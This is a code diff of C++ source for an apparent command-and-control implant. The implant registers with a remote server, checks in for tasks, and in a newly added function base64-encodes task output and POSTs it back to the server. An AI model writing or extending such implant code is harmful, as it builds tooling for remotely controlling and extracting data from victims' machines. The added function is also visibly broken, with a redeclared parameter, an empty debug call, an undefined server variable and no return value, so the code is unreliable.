@@ -7,6 +7,7 @@
 #include "task.h"
 #include "debug.h"
 #include "utils.h"
+#include "constants.h"
 #include <string>
 #include <iostream>
 
@@ -30,7 +31,7 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     // Register
     string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
     // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
-    DEBUG_PRINTF("Register response: %s", res.c_str());
+    DEBUG_PRINTF("Register response: %s\n", res.c_str());
     // cout << res_str << endl;
     rapidjson::Document resDocument;
     resDocument.Parse(res.c_str());
@@ -53,7 +54,6 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
 
 Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
 {
-    DEBUG_PRINTF("Checkin\n");
     PSIZE_T outSize = 0;
     //string authCookie = "Cookie: " + profile->cookie + "=" + profile->implantId;
     // char* authCookieString;
@@ -66,7 +66,6 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
     string res = HTTPRequest(L"GET", serverUrl, L"/c2/checkin", 8080, L"Hello-world", authCookie.c_str(), NULL, 0, outSize, FALSE);
     DEBUG_PRINTF("Checkin done\n");
-    DEBUG_PRINTF("Checkin response: %s\n", res.c_str());
     // decode and decrypt the response
     string resDecoded = res; /*decryptB64String(profile->base64ServerPublicKey,
                                          profile->base64EncryptionKey,
@@ -75,4 +74,41 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     DEBUG_PRINTF("Checkin response: %s\n", resDecoded.c_str());
     
     return parseTask(resDecoded);
+}
+
+bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success)
+{
+    /* Payload format:
+    {
+        "status": bool,
+        "tid": taskId,
+        "output": "base64 encoded results"
+    }
+    
+    */
+
+    // JSON encode the results
+    vector<BYTE> results = LPBYTEToVector(results, GetLPBYTELength(results));
+    string resultsB64 = base64Encode(results);
+    rapidjson::Document resultsDocument;
+    resultsDocument.SetObject();
+    rapidjson::Document::AllocatorType &allocator = resultsDocument.GetAllocator();
+    rapidjson::Value resultsVal(resultsB64.c_str(), allocator);
+    resultsDocument.AddMember("output", resultsVal, allocator);
+    rapidjson::Value tidVal(taskId, allocator);
+    resultsDocument.AddMember("tid", tidVal, allocator);
+    rapidjson::Value statusVal(success, allocator);
+    resultsDocument.AddMember("status", statusVal, allocator);
+
+    rapidjson::StringBuffer buffer;
+    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
+    resultsDocument.Accept(writer);
+    const char *results_json = buffer.GetString();
+
+    DEBUG_PRINTF()
+
+    // Send the results
+    PSIZE_T outSize = 0;
+    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)results_json, strlen(results_json), outSize, FALSE);
+    
 }
